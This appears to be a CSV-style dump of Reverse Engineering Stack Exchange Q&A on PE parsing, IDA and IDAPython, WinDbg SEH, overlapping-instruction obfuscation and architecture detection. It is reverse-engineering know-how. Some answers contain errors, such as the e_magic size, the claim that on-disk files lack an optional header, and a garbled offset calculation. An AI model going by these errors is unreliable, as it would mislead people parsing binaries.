","<p>I have extensive experience with parsing the PE on Windows, mainly for use in function interception. Here are the steps you should follow to achieve your goal.</p>

<p>The first step is to find the base address of the image loaded into memory. This step will be different depending on if the executable has or hasn't been mapped into memory, but the basic idea will be the same. Assuming that you are interested in doing this for a file on disk, then you may do this with the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa366556(v=vs.85).aspx"" rel=""nofollow noreferrer"">file mapping API</a>, if you would prefer to implement this on an executable loaded into memory as a running process, you can achieve the equivalent by using the the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms686849(v=vs.85).aspx"" rel=""nofollow noreferrer"">tool help snapshot API</a>. The base address will be the same as the field <code>hModule</code> in the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684225(v=vs.85).aspx"" rel=""nofollow noreferrer""><code>MODULEENTRY32</code></a> data retrieved from the snapshot. For more information about what a module handle is, see <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2004/06/14/155107.aspx"" rel=""nofollow noreferrer"">here</a>.</p>

<p>Once you have completed the first step, the structure at the base address is the <a href=""https://stackoverflow.com/questions/6126980/get-pointer-to-image-dos-header-with-getmodulehandle""><code>IMAGE_DOS_HEADER</code></a>, while this is not documented on MSDN, it has two very important but cryptic fields.  The two fields you will need to know are the <code>e_magic</code> field and the <code>e_lfanew</code> field. The <code>e_magic</code> field contains a double word for 32-bit or quadruple for 64-bit that allows you to test if the file being read or your implementation is correctly formatted with the correct value being defined as <code>IMAGE_DOS_SIGNATURE</code>, which is the ASCII-Z string of ""MZ\0"". The <code>e_lfanew</code> field contains a <a href=""https://stackoverflow.com/questions/2170843/va-virtual-adress-rva-relative-virtual-address"">relative virtual address</a> which you need to add to the image base you found in step one to calculate the <a href=""https://stackoverflow.com/questions/2170843/va-virtual-adress-rva-relative-virtual-address"">virtual address</a> of the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms680336(v=vs.85).aspx"" rel=""nofollow noreferrer""><code>IMAGE_NT_HEADERS</code></a> structure.</p>

<p>The third step will be to check the first member of the <code>IMAGE_NT_HEADERS</code> to see if it is an actual PE file, this will be defined by the <code>Signature</code> field of the structure, and the defined constant to test for will be <a href=""http://win32assembly.programminghorizon.com/pe-tut2.html"" rel=""nofollow noreferrer""><code>IMAGE_NT_SIGNATURE</code></a>. This is not typically nessecary, since most Windows versions will be using the PE format of executable file, but it's good practice in order to ensure your code is a bit more robust.</p>

<p>Once everything checks out and you have performed steps 1-3, step four will be when you can finally calculate the address of the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms680341(v=vs.85).aspx"" rel=""nofollow noreferrer""><code>IMAGE_SECTION_HEADER</code></a> structures. The IMAGE_SECTION_HEADER structures are stored as an array in the file, so to obtain the size of the array, you will need to use the <code>NumberOfSections</code> member in the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms680313(v=vs.85).aspx"" rel=""nofollow noreferrer""><code>IMAGE_FILE_HEADER</code></a> structure which is nested in the <code>IMAGE_NT_HEADERS</code> structure mentioned above.Once you have that value, you may find the virtual address of the first <code>IMAGE_SECTION_HEADER</code> by adding the size of the <code>Signature</code> member of the <code>IMAGE_NT_HEADERS</code> structure, the size of the <code>FileHeader</code> member in the <code>IMAGE_NT_HEADERS</code> structure, and finally the <code>SizeOfOptionalHeader</code> value in the <code>IMAGE_FILE_HEADER</code> structure. The reason you can't simply do a <code>sizeof(</code> <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms680339(v=vs.85).aspx"" rel=""nofollow noreferrer""><code>IMAGE_OPTIONAL_HEADER</code></a> <code>)</code> for the last value in the formula listed above is because a file on disk <strong><em>will not</em></strong> have the <code>IMAGE_OPTIONAL_HEADER</code>, so to obtain the proper size dynamically, you should do so through the structure member I mentioned earlier.</p>

<p>Now you may simply copy the array of <code>IMAGE_SECTION_HEADER</code> structures from memory any way you please. Just remember, that these structures <em>are contigous</em> in memory, so all you need to do is multiply the size of each structure by the number of sections to find the total size of the entire array in memory. After you have calculate that value, it will be trivial to collect the data.</p>

<p>For more resources on the PE executable format, see this wonderful article written by Matt Pietrek, <a href=""http://msdn.microsoft.com/en-us/library/ms809762.aspx"" rel=""nofollow noreferrer""><em>Peering Inside the PE</em></a>. You may also take a look at the official specification <a href=""http://msdn.microsoft.com/en-us/gg463119.aspx"" rel=""nofollow noreferrer"">here</a>.</p>
","6081"
"Using IDA Python Iterate Through All Functions and Their Instructions","3784","","<p>I'm new to IDAPython. Basically I want to iterate through all functions in an IDB file and their instructions using ida python script. The final goal is to export the functions &amp; their instructions from idapro. in certain format.</p>

<pre><code>from idautils import *
from idaapi import *

ea = BeginEA()
for funcea in Functions(SegStart(ea), SegEnd(ea)):
    functionName = GetFunctionName(funcea)
    print functionName
</code></pre>

<p>Using above script I'm retrieving function names, now I also want to print the assembly instructions of each function. I know may I have to use GetDisasm(ea), not sure how to use the API.</p>

<p>TIA</p>
","<p>Please note that it will print only those functions that were recognized as such by IDA autoanalysis or defined manually, exactly as your code snippet. This snippet is not debugged, use on your own risk.</p>

<pre><code>from idautils import *
from idaapi import *
from idc import *

for segea in Segments():
    for funcea in Functions(segea, SegEnd(segea)):
        functionName = GetFunctionName(funcea)
        for (startea, endea) in Chunks(funcea):
            for head in Heads(startea, endea):
                print functionName, "":"", ""0x%08x""%(head), "":"", GetDisasm(head)
</code></pre>

<p>If you want to extract the instructions as binary you can use <code>idc.NextHead</code> function to get instruction boundaries.</p>

<p>The function chunks mentioned in the code are not the same as we see in the the graph view in IDA (the function has more than one chunk if it is discontinuous
): chunks in graph view are called <a href=""https://en.wikipedia.org/wiki/Basic_block"" rel=""nofollow noreferrer"">""basic blocks""</a>, see more correct definition by the link.</p>
","14726"
"How can I view FS:[0] with windbg?","3769","","<p>It seems that Windows 8 broke Ollydbg as several <code>ntdll</code> functions keep throwing exception <code>0xC0000008</code> and crashing my debugger.</p>

<p>I am now using Windbg.  But, I am unable to view <code>FS</code> (specifically <code>FS:[0]</code>).  How can I get a dump of <code>FS</code> via Windbg? I've tried googling to no avail.  I am specifically interested in SEH, but all I can find is dumping TEB or PEB.</p>
","<p>SEH chain can be viewed in WinDbg by issuing <code>!exchain</code> command.</p>

<pre><code>0:000&gt; !exchain    # display the SEH chain
0012ffb0: wireshark!_except_handler4+0 (00522555)
0012ffe0: kernel32!_except_handler3+0 (7c839ac0)
  CRT scope  0, filter: kernel32!BaseProcessStart+29 (7c843882)
                func:   kernel32!BaseProcessStart+3a (7c843898)
Invalid exception stack at ffffffff
</code></pre>

<p><code>FS:[0]</code> is the pointer to the start of <strong>SEH chain</strong>. You can walk through the output produced by <code>!exchain</code> to find <code>FS:[0]</code> </p>
","5871"
"What is the difference between static disassembly and dynamic disassembly?","3749","","<p>I am told that tools like <strong>IDA Pro</strong> are static disassembly tool,
and tools like <strong>OllyDbg</strong> are dynamic disassembly tool.</p>

<p>But from the using experiences on these tools, I don't think there 
is any difference between the tools in <strong>disassembly</strong> procedure.</p>

<p>Basically all you need to do is load binary file into IDA or OllyDbg, 
and they will use certain recursive disassembly algorithm to disassembly
the binary and give you the output.</p>

<p>Am I wrong..? Then what is the difference between static disassembly 
and dynamic disassembly..?</p>

<p>Thank you!</p>
","<p>You have a mix up here. There is no such thing as dynamic disassembly and static disassembly but rather <a href=""http://en.wikipedia.org/wiki/Dynamic_program_analysis"">dynamic</a> </p>

<blockquote>
  <p>Dynamic program analysis is the analysis of computer software that is performed by executing programs on a real or virtual processor.</p>
</blockquote>

<p>and <a href=""http://en.wikipedia.org/wiki/Static_program_analysis"">static analysis</a> of a binary. </p>

<blockquote>
  <p>Static program analysis is the analysis of computer software that is performed without actually executing programs</p>
</blockquote>

<p>What do the mentioned tools have are different disassembly engines which sometimes produce different results, mainly from binaries which incorporate anti-disassembly techniques. </p>
","3475"
"How can I change the Read/Write/Execute flags on a segment in IDA?","3741","","<p>Sometimes when you load a binary manually in IDA you wind up with segments that have unknown read write and execute flags. You can see them under the Segments subview (<kbd>Shift</kbd> + <kbd>F7</kbd>). Is there a way to change these flags from within the GUI of IDA without running a script and modifying them? </p>

<p>It seems like such a basic piece of functionality which is very important for the proper operation of the Hex Rays decompiler. I've been using the class to express segment rights which just seems wrong considering these flags exist.</p>

<p>Although I would appreciate the question being answered in the general case, in this particular case I'm dealing with flat binary ARM files with code and data intermixed. All page level permissions are set up by the software when it loads by directly mapping them via the MMU.</p>
","<p>I don't know of anything natively built into the GUI that allows you to change the segment permissions, but you can easily change the segment permissions with IDC.</p>

<p>From IDA's help file:</p>

<pre><code>SetSegmentAttr  

***********************************************
** set segment attribute
        arguments:      segea - any address within segment
                        attr  - one of SEGATTR_... constants
                        value - the new value of the attribute

success SetSegmentAttr(long segea, long attr, long value);
SEGATTR_ALIGN          alignment
SEGATTR_COMB           combination
SEGATTR_PERM           permissions
SEGATTR_FLAGS          segment flags
SEGATTR_SEL            segment selector
SEGATTR_ES             default ES value
SEGATTR_CS             default CS value
SEGATTR_SS             default SS value
SEGATTR_DS             default DS value
SEGATTR_FS             default FS value
SEGATTR_GS             default GS value
SEGATTR_TYPE           segment type
SEGATTR_COLOR          segment color
</code></pre>

<p>From segment.hpp:</p>

<pre><code>/* 22 */  uchar perm;           // Segment permissions (0-no information)
#define SEGPERM_EXEC  1 // Execute
#define SEGPERM_WRITE 2 // Write
#define SEGPERM_READ  4 // Read
</code></pre>

<p>As such, if you wanted to set the permissions of a segment that begins at VA 0x00400000 to both Read and Execute, you could just run the following IDC command:</p>

<p><code>SetSegmentAttr(0x00400000, SEGATTR_PERM, 4 | 1);</code></p>

<p>Alternatively, if you're <em>just</em> looking to deal with warnings from Hex-Rays, it <em>may</em> suffice to use the Segments view in the GUI to change a segment's class from <code>CODE</code> to <code>DATA</code>.</p>
","2399"
"What is ""overlapping instructions"" obfuscation?","3707","","<p>I analyzed some binaries in x86/x86-64 using some obfuscation tricks. One was called <em>overlapping instructions</em>. Can someone explain how does this obfuscation work and how to work around?</p>
","<p>The paper <a href=""http://infoscience.epfl.ch/record/167546/files/thesis.pdf"">Static Analysis of x86 Executables</a> explains overlapping instructions quite well. The following example is taken from it (page 28):</p>

<pre><code>0000: B8 00 03 C1 BB  mov eax, 0xBBC10300
0005: B9 00 00 00 05  mov ecx, 0x05000000
000A: 03 C1           add eax, ecx
000C: EB F4           jmp $-10
000E: 03 C3           add eax, ebx
0010: C3              ret
</code></pre>

<p>By looking at the code, it is not apparent what the value of eax will be at the return instruction (or that the return instruction is ever reached, for that matter). This is due to the jump from 000C to 0002, an address which is not explicitly present in the listing (jmp $-10 denotes a relative jump from the current program counter value, which is 0xC, and 0xC10 = 2). This jump transfers control to the third byte of the five byte long move instruction at address 0000. Executing the byte sequence starting at address 0002 unfolds a completely new instruction stream:</p>

<pre><code>0000: B8 00 03 C1 BB  mov eax, 0xBBC10300
0005: B9 00 00 00 05  mov ecx, 0x05000000
000A: 03 C1           add eax, ecx
000C: EB F4           jmp $-10
0002: 03 C1           add eax, ecx
0004: BB B9 00 00 00  mov ebx, 0xB9
0009: 05 03 C1 EB F4  add eax, 0xF4EBC103
000E: 03 C3           add eax, ebx
0010: C3              ret
</code></pre>

<p>It would be interesting to know if/how Ida Pro and especially the Hex Rays plugin handle this. Perhaps @IgorSkochinsky can comment on this...</p>
","1532"
"Mixed 16/32-bit code reversing using IDA","3638","","<p>I am trying to reverse engineer a binary blob I expect to transition from 16-bit real mode into 32-bit protected mode (it is boot time code), so I expect the code to contain code of both sorts.</p>

<p>When I launch IDA, I am given the option of 16 or 32-bit code, but not mixed.</p>

<p>How do I instruct IDA to attempt to disassemble data at a given address as 32-bit mode?</p>

<p>I can using the 16-bit analyzer deduce the initial jump (unoriginally) and IDA happily analyses the code from there. I can see where the 32-bit code jumps to (far jump, so IDA doesn't try to analyze it), but IDA treats this as 16-bit when I hit <kbd>C</kbd>.</p>

<p>Other than launching a 16, and a 32-bit dissasmbly session, can I do this in one?</p>
","<p><strong>Ida Free 5</strong></p>

<pre><code>Edit -&gt; Segments -&gt;CreateSegment
</code></pre>

<p>in the dialog</p>

<pre><code>segment name  = seg001....seg00n
start         = &lt;start address viz 0x0A
end           = &lt;end address viz 0x1e
base          = 0x0 
class         = some text viz 32one,32two,16three
radio button  = 32 bit segment or 16 bit segment as needed
click yes to a cryptic dialog 
</code></pre>

<p>example 
the binary stream contains 16 bit dos puts routine and 32 bit random pushes intermixed</p>

<pre><code>C:\Documents and Settings\Admin\Desktop&gt;xxd -g 1 1632blob.bin
0000000: b4 01 cd 21 88 c2 b4 02 cd 21 68 78 56 34 12 68  ...!.....!hxV4.h
0000010: 0d d0 37 13 68 be ba 37 13 68 00 0d db ba b4 01  ..7.h..7.h......
0000020: cd 21 88 c2 b4 02 cd 21 68 78 56 34 12 68 0d d0  .!.....!hxV4.h..
0000030: 37 13 68 be ba 37 13 68 00 0d db ba b4 01 cd 21  7.h..7.h.......!
0000040: 88 c2 b4 02 cd 21 68 78 56 34 12 68 0d d0 37 13  .....!hxV4.h..7.
0000050: 68 be ba 37 13 68 00 0d db ba                    h..7.h....

C:\Documents and Settings\Admin\Desktop&gt;
</code></pre>

<p>loading this blob as binary file moving to <code>offset 0</code> and pressing <code>c</code> would disassemble all bytes as <code>16 bit</code> </p>

<p>now you can move to <code>offset 0x0a</code> and create a <code>32 bit segment</code> with start as <code>0x0a end as 0x1e base as 0x0 class as 32one use 32bitsegment radio button</code> and press <code>c</code> again to create 32 bit disassembly</p>

<p>see below</p>

<pre><code>seg000:0000                ;
seg000:0000                ; +-------------------------------------------------------------------------+
seg000:0000                ; ¦     This file is generated by The Interactive Disassembler (IDA)        ¦
seg000:0000                ; ¦     Copyright (c) 2010 by Hex-Rays SA, &lt;support@hex-rays.com&gt;           ¦
seg000:0000                ; ¦                      Licensed to: Freeware version                      ¦
seg000:0000                ; +-------------------------------------------------------------------------+
seg000:0000                ;
seg000:0000                ; Input MD5   : AEB17B9F8C4FD00BF2C04A4B3399CED1
seg000:0000
seg000:0000                ; ---------------------------------------------------------------------------
seg000:0000
seg000:0000                                .686p
seg000:0000                                .mmx
seg000:0000                                .model flat
seg000:0000
seg000:0000                ; ---------------------------------------------------------------------------
seg000:0000
seg000:0000                ; Segment type: Pure code
seg000:0000                seg000          segment byte public 'CODE' use16
seg000:0000                                assume cs:seg000
seg000:0000                                assume es:seg005, ss:seg005, ds:seg005, fs:seg005, gs:seg005
seg000:0000 B4 01                          mov     ah, 1
seg000:0002 CD 21                          int     21h
seg000:0004 88 C2                          mov     dl, al
seg000:0006 B4 02                          mov     ah, 2
seg000:0008 CD 21                          int     21h
seg000:0008                seg000          ends
seg000:0008
seg001:0000000A                ; ---------------------------------------------------------------------------
seg001:0000000A
seg001:0000000A                ; Segment type: Regular
seg001:0000000A                seg001          segment byte public '32one' use32
seg001:0000000A                                assume cs:seg001
seg001:0000000A                                ;org 0Ah
seg001:0000000A                                assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg001:0000000A 68 78 56 34 12                 push    12345678h
seg001:0000000F 68 0D D0 37 13                 push    1337D00Dh
seg001:00000014 68 BE BA 37 13                 push    1337BABEh
seg001:00000019 68 00 0D DB BA                 push    0BADB0D00h
seg001:00000019                seg001          ends
seg001:00000019
seg002:001E                ; ---------------------------------------------------------------------------
seg002:001E
seg002:001E                ; Segment type: Pure code
seg002:001E                seg002          segment byte public 'CODE' use16
seg002:001E                                assume cs:seg002
seg002:001E                                ;org 1Eh
seg002:001E                                assume es:seg005, ss:seg005, ds:seg005, fs:seg005, gs:seg005
seg002:001E B4 01                          mov     ah, 1
seg002:0020 CD 21                          int     21h
seg002:0022 88 C2                          mov     dl, al
seg002:0024 B4 02                          mov     ah, 2
seg002:0026 CD 21                          int     21h
seg002:0026                seg002          ends
seg002:0026
seg003:00000028                ; ---------------------------------------------------------------------------
seg003:00000028
seg003:00000028                ; Segment type: Regular
seg003:00000028                seg003          segment byte public '32two' use32
seg003:00000028                                assume cs:seg003
seg003:00000028                                ;org 28h
seg003:00000028                                assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg003:00000028 68 78 56 34 12                 push    12345678h
seg003:0000002D 68 0D D0 37 13                 push    1337D00Dh
seg003:00000032 68 BE BA 37 13                 push    1337BABEh
seg003:00000037 68 00 0D DB BA                 push    0BADB0D00h
seg003:00000037                seg003          ends
seg003:00000037
seg004:003C                ; ---------------------------------------------------------------------------
seg004:003C
seg004:003C                ; Segment type: Pure code
seg004:003C                seg004          segment byte public 'CODE' use16
seg004:003C                                assume cs:seg004
seg004:003C                                ;org 3Ch
seg004:003C                                assume es:seg005, ss:seg005, ds:seg005, fs:seg005, gs:seg005
seg004:003C B4 01                          mov     ah, 1
seg004:003E CD 21                          int     21h
seg004:0040 88 C2                          mov     dl, al
seg004:0042 B4 02                          mov     ah, 2
seg004:0044 CD 21                          int     21h
seg004:0044                seg004          ends
seg004:0044
seg005:00000046                ; ---------------------------------------------------------------------------
seg005:00000046
seg005:00000046                ; Segment type: Regular
seg005:00000046                seg005          segment byte public '32three' use32
seg005:00000046                                assume cs:seg005
seg005:00000046                                ;org 46h
seg005:00000046                                assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg005:00000046 68 78 56 34 12                 push    12345678h
seg005:0000004B 68 0D D0 37 13                 push    1337D00Dh
seg005:00000050 68 BE BA 37 13                 push    1337BABEh
seg005:00000055 68 00 0D DB BA                 push    0BADB0D00h
seg005:00000055                seg005          ends
seg005:00000055
seg005:00000055
seg005:00000055                                end
</code></pre>
","2444"
"Check if exe is 64-bit","3624","","<p>How to check if Windows executable is 64-bit reading only its binary. Without executing it and not using any tools like the SDK tool <a href=""http://msdn.microsoft.com/en-us/library/c1h23y6c.aspx""><code>dumpbin.exe</code></a> with the <code>/headers</code> option.</p>
","<p>Executable type is indicated by PE header, <a href=""http://msdn.microsoft.com/en-us/windows/hardware/gg463119.aspx"" rel=""nofollow noreferrer"">download</a> documentation.</p>

<p>The first word (two bytes) of PE header indicates target machine, here is a list of possible values:</p>

<pre><code>0x0000 - The contents of this field are assumed to be applicable to any machine type
0x01d3 - Matsushita AM33
0x8664 - x64
0x01c0 - ARM little endian
0x01c4 - ARMv7 (or higher) Thumb mode only
0xaa64 - ARMv8 in 64-bit mode
0x0ebc - EFI byte code
0x014c - Intel 386 or later processors and compatible processors
0x0200 - Intel Itanium processor family
0x9041 - Mitsubishi M32R little endian
0x0266 - MIPS16
0x0366 - MIPS with FPU
0x0466 - MIPS16 with FPU
0x01f0 - Power PC little endian
0x01f1 - Power PC with floating point support
0x0166 - MIPS little endian
0x01a2 - Hitachi SH3
0x01a3 - Hitachi SH3 DSP
0x01a6 - Hitachi SH4
0x01a8 - Hitachi SH5
0x01c2 - ARM or Thumb (“interworking”)
0x0169 - MIPS little-endian WCE v2
</code></pre>

<p>So to check if it is 64-bit, we need to look for:</p>

<pre><code>0x8664 - x64
0xaa64 - ARMv8 in 64-bit mode
0x0200 - Intel Itanium processor family
</code></pre>

<p>And as <a href=""https://reverseengineering.stackexchange.com/users/8260/bob"">Bob</a> mentioned, <a href=""ftp://ftp.openwatcom.org/pub/devel/docs/pecoff.pdf"" rel=""nofollow noreferrer"">here</a> is a list of some more machine types (see 11 pg.), however it is not very likely to find them.</p>
","6041"
"Exporting structures and enums in IDA","3572","","<p>It is possible to import structures and enums declarations from C files in IDA. 
However, is it possible to export structures and enums to C?</p>
","<p>It is possible to export a structure by going in <strong>Local Types</strong> (<kbd>Shift+F1</kbd>). Then select the structure you want to export and in the contextual menu choose either <strong>Edit</strong> or <strong>Export to header file</strong>. It is possible to export multiple structures by holding Shift when selecting them.</p>
","2409"
"Where could one find a collection of mid-file binary signatures?","3569","","<p>While reading <a href=""https://reverseengineering.stackexchange.com/a/2996/115"">an answer to another question</a>, it was mentioned that ""<code>78 9C</code>"" was a well-known pattern for Zlib compressed data. Intrigued, I decided to search up the signature on <a href=""http://www.filesignatures.net/index.php?search=789c&amp;mode=SIG"" rel=""nofollow noreferrer"">the file signature database</a> to see if there were any related numbers. It wasn't on there. So I checked on <a href=""http://www.garykessler.net/library/file_sigs.html"" rel=""nofollow noreferrer"">Gary Kessler's magic number list</a> to see that it wasn't there either.</p>

<p>I even ended up creating a binary file with the signature at the beginning and ran ""<code>file</code>"" on it as a sort of <em>""I-doubt-it-will-work-but-maybe""</em> attempt (Since that works with ""<code>50 4b</code>"" because that is a valid ZIP file header and is commonly in the middle of other files.) But none of these attempts revealed that I was looking at a Zlib signature.</p>

<p>It would appear as though most magic number databases only contain file-format magic numbers rather than numbers to differentiate data in the middle of a file. So, my question is:</p>

<p>Are there any places one could find a list of binary signatures of certain types of data streams that are <em>not</em> file formats themselves? Data that is not a file itself, but rather <em>inside</em> a file. </p>

<p>Thanks in advance.</p>
","<p>Are you perhaps looking for <a href=""https://code.google.com/p/binwalk/"" rel=""nofollow"">binwalk</a>? Especially the <em>magic</em> folder of its source code.</p>
","3002"
"How is a structure located within a disassembled program?","3541","","<p>I took a basic 40-hr Reverse Engineering course a few summers ago. While teaching us to use IDAPro, the instructor demonstrated, rather quickly and without explaining much, how to label certain variables in the ASM as members of a structure, basically equivalent to a good old fashioned <code>struct</code> in C/C++, and treat them as such wherever they are seen in the rest of the code. This seems rather useful to me.</p>

<p>What he did not cover, however, was how to identify a structure. How do you know when a group of variables does in fact constitute a structure and not just a set of related variables? How can you be sure that the author used a <code>struct</code> (or something similar) there?</p>
","<p>There are very common patterns that you will find in code that denote structure usage.</p>

<h2>Dereferencing offsets:</h2>

<p>If you have a pointer which is dereferenced at some non-zero offset, you are probably dealing with a structure. Look for patterns like:</p>

<pre><code>mov eax, [ebp-8]  ; Load a local variable into eax
mov ecx, [eax+8]  ; **Dereference a dword at eax+8**
</code></pre>

<p>In this example, we have a variable that contains a pointer, but we care about the contents of memory at some specific offset <em>ahead</em> of the pointer.  This is exactly how structures are used:  We get a pointer to the structure, and then dereference the pointer plus some offset to access a specific member. In C, the syntax for this is: <code>pMyStruct-&gt;member_at_offset_8</code>.</p>

<p><strong>Side note</strong>:  Do not confuse dereferencing at the offset of some variable with dereferencing at offsets of the stack pointer or the frame pointer (<code>esp</code> or <code>ebp</code>).  Of course, you could think of the local variables and function arguments as being one large structure, but in C, they are not explicitly defined as such.</p>

<h2>More subtle pointer offsets:</h2>

<p>You don't actually need to <em>dereference</em> anything to detect a structure member.  For example:</p>

<pre><code>mov eax, [ebp-8]     ; Load a local variable into eax
push 30h             ; num = 30h
push aSampleString   ; src = ""Sample String""
add eax, 0Ch
push eax             ; dst = eax + 0xC
call strncpy
</code></pre>

<p>In this example, we are copying up to 0x30 characters from some source string to <code>eax + 0xC</code> (see <a href=""http://www.cplusplus.com/reference/cstring/strncpy/"" rel=""nofollow"">strncpy</a>).  This tells us that <code>eax</code> <em>probably</em> points to a structure with a string buffer (of at least 0x30 bytes) at offset 0xC.  For example, the structure may look something like:</p>

<pre><code>struct _MYSTRUCT
{
    DWORD a;      // +0x0
    DWORD b;      // +0x4
    DWORD c;      // +0x8
    CHAR d[0x30]; // +0xC
    ...
}
</code></pre>

<p>In which case, the sample code would look like:</p>

<pre><code>strncpy(&amp;pMyStruct-&gt;d, ""Sample String"", sizeof(pMyStruct-&gt;d));
</code></pre>

<p><strong>Side note:</strong> It is possible (though unlikely) that we could be copying to a large string buffer at offset +0xC, but you would be able to determine this through context.  If, say, offset +0x8 were an integer, for example, then it's definitely a struct.  But if we copied a string of fixed length 0xC to address <code>eax</code> then copied another string to address <code>eax+0xC</code>, it's probably one giant string.</p>

<h2>All reads / all writes:</h2>

<p>Let's say you have a struct (<em>not</em> a pointer to a struct) as a local variable your stack.  Most of the time, IDA doesn't know the difference between a struct on the stack or a bunch of individual local variables.  But a huge tip-off that you're dealing with a structure is if you only ever read from a variable without writing to it, or (less so) if you only write to a variable without reading from it.  Here's an example of each:</p>

<pre><code>lea eax, [ebp+var_58]  ; Load THE ADDRESS of a local variable into eax
push eax
call some_function
mov eax, [ebp+var_54]  ; Let's say we've never touched var_54 before...
test eax, eax          ; ...But we're checking its value!
jz somewhere
...
</code></pre>

<p>In this example, we're reading from <code>var_54</code> without ever writing anything to it (within this function).  This <em>probably</em> means that it is a member of a structure which was accessed from some other function call.  In this example, it's implied that <code>var_58</code> might be the start of that structure, since its address is pushed as the argument to <code>some_function</code>.  You can verify this by following the logic of <code>some_function</code> and checking if its argument is ever dereferenced (and modified) at offset +0x4.  Of course, this doesn't necessarily have to happen in <code>some_function</code> -- it could happen in one of its child functions, or one of <em>its</em> child functions, etc.</p>

<p>A similar example exists for writing:</p>

<pre><code>xor eax, eax
mov [ebp+var_28], eax  ; Let's say this is the *only* time var_28 is touched
lea eax, [ebp+var_30]
push eax
call some_other_function
...
</code></pre>

<p>When you see local variables being set and then never referenced again, you can't just forget about them, because they could very likely be members of a structure which is passed on to another function.  This example implies that a structure (which starts at <code>var_30</code>) is written to at offset +0x8 before the address of that structure is passed to <code>some_other_function</code>.</p>

<p>Both of these examples in C might look like:</p>

<pre><code>some_function(&amp;myStruct);
if (myStruct.member_at_offset_4) ...
</code></pre>

<p>and</p>

<pre><code>myStruct.member_at_offset_8 = 0;
some_other_function(&amp;myStruct);
</code></pre>

<p><strong>Side note:</strong> Although each of these examples used local variables, the same logic applies to globals.</p>

<h2>Documented functions that expect structures:</h2>

<p>This one's probably obvious, and IDA will handle this for you almost all of the time, but an easy way to know when you have a structure in your code is if you call a documented function that expects a certain structure.  For example, <code>CreateProcessW</code> expects a pointer to a <code>STARTUPINFOW</code> structure.  This one shouldn't require an example.</p>

<h2>How do I know if these patterns <em>actually</em> indicate structure usage?</h2>

<p>One final point I want to make is that in all of these cases, yes, technically, the author of the program <em>could</em> written their code without the use of structures.  They also could have written their code by defining every function as <code>__declspec(naked)</code> with a large <code>__asm</code> inline.  You'd never be able to tell.  But arguably, it doesn't matter.  If there are logical groups of values that are stored contiguously in memory and passed from function to function, it is still meaningful to annotate them as structures.  Almost all of the time, this is how the author wrote their code anyway.</p>

<p>If you need me to elaborate on anything, let me know.</p>
","136"
"Tool or data for analysis of binary code to detect CPU architecture","3503","","<p>Assuming that I have binary file with code for unknow CPU can I somehow detect cpu architecture? I know that it depends mostly on compiler but I think that for most of CPU architectures it should be alot of CALL/RETN/JMP/PUSH/POP opcodes (statistically more than others). Or maybe should I search for some patterns in code specific for CPU (instead of opcodes occurrence)?</p>
","<p><em>When you have a hammer, all the problems look like nails...</em></p>

<p>I´ve studied something called Normalized Compression Distance - <a href=""http://en.wikipedia.org/wiki/Normalized_Compression_Distance#Normalized_compression_distance"">NCD</a>  - some time ago, and I'd give it a try if I had a problem similar to yours.</p>

<ol>
<li><p>I´d make a database of examples. Would take 20 programs for each architecture you want to know, with variable sizes, and save them.</p></li>
<li><p>When confronted with a program that I wanted to know which architecture it is, I´d compute it´s NCD against all my examples.</p></li>
<li><p>I´d pick the best (smaller) NCD and would then verify it if is was a real match (let´s say, trying to run it on the discovered architecture).</p></li>
</ol>

<p><em>Update</em></p>

<p>I´ve always done in <em>by hand</em>, when it comes to NCD. How I did it:</p>

<ul>
<li><p>you have 20 files for SPARC and you call them A01, A02, A03, and so on. Your x86 files: B01, B02, etc.</p></li>
<li><p>You get the unknown file and call it XX.</p></li>
<li><p>Choose your preferred compression tool (I used Gzip, but see remarks at the end of this answer).</p></li>
<li><p>Calculate NCD for the first pair:</p></li>
</ul>

<p>NCD(XX,A01) = ( Z(XX+A01) - min(Z(XX), Z(A01) ) / max(Z(XX), Z(A01))</p>

<p>Z( something ) -> means that you compress the <em>something</em> with Gzip and get the file size after compression. For example, 8763 bytes, so Z(something) = 8763.</p>

<p>XX + A01 -> means that you concatenate things. You append the A01 file to the end of the XX file. In linux, you could do a ´cat XX A01 > XXA01´.</p>

<p>min() and max() -> you calculate the compressed size of XX and A01, and use the minimum and maximum that you get.</p>

<p>So you´ll have a NCD value: it´ll lie between 0 and 1, and use as many decimals places as you can, because sometimes the difference is in the 7th or 8th digit. It´ll be like comparing 0.999999887 to 0.999999524.</p>

<p>You´ll do that for every file, so you´ll have 20 NCD results for SPARC, 20 for x86...</p>

<p>Get the smaller NCD of all. Let´s say that the B07 file gave you the smaller NCD. So, probably, the unknow file is a x86.</p>

<p>Tips:</p>

<ul>
<li><p>your unknow and your test files must have a similar size. When you compare a file with bigger or smaller ones, NCD won´t do it´s magic. So, if you´ll be testing files of 5 to 10k, I´d get test files of 2.5k, 5k, 7.5k, 10k, 12.5k ...</p></li>
<li><p>In my Master degree I got better results always using the smaller NCD value. The second best method was to do some voting: get the 5 smaller NCD results, and see which architecture got more votes. Ex.: smaller NCD were A03, A05, B02, B06, B07 -> B go 3 votes, so I´d say it´s a x86...</p></li>
<li><p>compressors based on the Zip construction have a limitation of 32kB: the way they compress things, they just consider 32kB at time. If your XX + A01 is bigger than this, Gzip, Zip, etc., won´t give you good results. So, for files that are bigger than 15 or 16kB, I´d choose another compressor: PPMD, Bzip...</p></li>
</ul>
","2900"
"How to extract code form .exe file having signature Borland Delphi 6.0 - 7.0 [Overlay]","3492","","<p><a href=""https://i.stack.imgur.com/JdO64.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/JdO64.png"" alt=""enter image description here""></a>when i input .exe file to PEiD v0.95 it gives output like
<strong><em>""Borland Delphi 6.0 - 7.0 [Overlay]""</em></strong></p>

<p>Now i want to retrieve code from .exe file. So how to do that . Can any one give me right path for that.</p>
","<p>I had the same question.. Unfortunatly thre is no tool that can provides you the original source code. But the perfect solution that I found is to use OllyDbg or IdaPro. In this way you can navigate inside the code reading ASM lenguage.</p>

